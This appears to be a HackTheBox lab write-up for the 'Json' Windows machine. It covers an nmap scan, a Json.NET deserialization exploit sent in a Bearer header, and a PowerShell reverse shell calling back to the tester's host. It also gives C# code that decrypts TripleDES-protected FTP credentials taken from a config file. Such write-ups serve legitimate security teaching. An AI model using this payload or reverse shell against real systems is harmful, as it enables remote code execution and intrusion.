---
title: "Json - HackTheBox"
date: 2019-11-04T17:05:46+01:00
tags: []
---

As usual, let's start with a port scan:
```
$ nmap -A -T4 10.10.10.158
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 10:11 EST
Nmap scan report for 10.10.10.158
Host is up (0.060s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          FileZilla ftpd
| ftp-syst:
|_  SYST: UNIX emulated by FileZilla
80/tcp    open  http         Microsoft IIS httpd 8.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Json HTB
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h00m50s, deviation: 0s, median: 4h00m49s
|_nbstat: NetBIOS name: JSON, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:7a:c3 (VMware)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-02-16T19:13:29
|_  start_date: 2020-02-16T04:04:18
```

The server is composed of a login page:
![](/images/hackthebox/json/login.png)

And trying common credentials we find out that `admin:admin` works, but a non
functional web app is behind the login, so there's nothing to do there. An
interesting thing is that a cookie named `OAuth2` gets set, and decoding it's
base64 value we get:

```
{
  "Id": 1,
  "UserName": "admin",
  "Password": "21232f297a57a5a743894a0e4a801fc3",
  "Name": "User Admin HTB",
  "Rol": "Administrator"
}
```

By intercepting the request with Burp we can see that the same value will be
sent in the Bearer HTTP header:
![](/images/hackthebox/json/bearer.png)

Modifying it to a random value will trigger an error:
![](/images/hackthebox/json/error.png)

Using a base64 valid value we get another error:
![](/images/hackthebox/json/json-error.png)

This time we get more information about the backend, it seems like it uses
Json.NET to deserialize the data.

We can use [ysoserial](https://github.com/pwntester/ysoserial.net) to generate
custom payloads to exploit this vulnerability, you can read more about it
[here](https://speakerdeck.com/pwntester/attacking-net-serialization).

As the command that I want to execute contains a lot of characters that needs to
be escaped, I crafted the payload manually by modifing the one found on the
Github page, here is it:

```
{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['powershell','-nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'10.10.14.81\',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```

It's just a basic reverse shell for Powershell. Save it in a file and after
running a netcat listener, make the request with `curl
http://10.10.10.158/api/Account -H "Bearer: $(base64 -w 0 <filename>)"`.

```
$ rlwrap nc -lnvp 1337
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.10.158
Ncat: Connection from 10.10.10.158:50439.
PS C:\windows\system32\inetsrv> whoami
json\userpool
```

And we have a shell as `userpool`. Let's check if we can read the flag:
```
PS C:\windows\system32\inetsrv> Get-Acl C:\Users\userpool\Desktop\user.txt


    Directory: C:\Users\userpool\Desktop


Path                       Owner                      Access
----                       -----                      ------
user.txt                   JSON\userpool              NT AUTHORITY\SYSTEM Al...
```

## Privilege escalation

While inspecting the files on the drive, I found a curious one in `C:\Program
Files\Sync2Ftp\SyncLocation.exe.config`:
```
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
  <appSettings>
    <add key="destinationFolder" value="ftp://localhost/"/>
    <add key="sourcefolder" value="C:\inetpub\wwwroot\jsonapp\Files"/>
    <add key="user" value="4as8gqENn26uTs9srvQLyg=="/>
    <add key="minute" value="30"/>
    <add key="password" value="oQ5iORgUrswNRsJKH9VaCw=="></add>
    <add key="SecurityKey" value="_5TL#+GWWFv6pfT3!GXw7D86pkRRTv+$$tk^cL5hdU%"/>
  </appSettings>
  <startup>
    <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.7.2" />
  </startup>


</configuration>
```

It looks like we have some encrypted credentials. We can use
[dnSpy](https://github.com/0xd4d/dnSpy) to reverse the `SyncLocation.exe` file
and understand more about how it decrypts the credentials:
![](/images/hackthebox/json/dnspy.png)

Cool, easy and simple! Let's copy the code and modify it a bit:
```csharp
using System;
using System.Text;
using System.Security.Cryptography;
using System.Configuration;

public class Program {
    public static string Decrypt(string cipherString, bool useHashing)
    {
        byte[] array = Convert.FromBase64String(cipherString);
        AppSettingsReader appSettingsReader = new AppSettingsReader();
        string s = "_5TL#+GWWFv6pfT3!GXw7D86pkRRTv+$$tk^cL5hdU%";
        byte[] key;
        if (useHashing)
        {
            MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
            key = md5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(s));
            md5CryptoServiceProvider.Clear();
        }
        else
        {
            key = Encoding.UTF8.GetBytes(s);
        }
        TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
        tripleDESCryptoServiceProvider.Key = key;
        tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
        tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
        ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
        byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
        tripleDESCryptoServiceProvider.Clear();
        return Encoding.UTF8.GetString(bytes);
    }

    public static void Main()
    {
        Console.WriteLine(Decrypt("4as8gqENn26uTs9srvQLyg==", true));
        Console.WriteLine(Decrypt("oQ5iORgUrswNRsJKH9VaCw==", true));
    }
}
```

We can use an online compile like [dotnetfiddle](https://dotnetfiddle.net/) and
after running it we get the credentials:
```
superadmin
funnyhtb
```

Using them to login into the FTP server allows us to read the flag:
![](/images/hackthebox/json/root.png)

Thanks for reading!
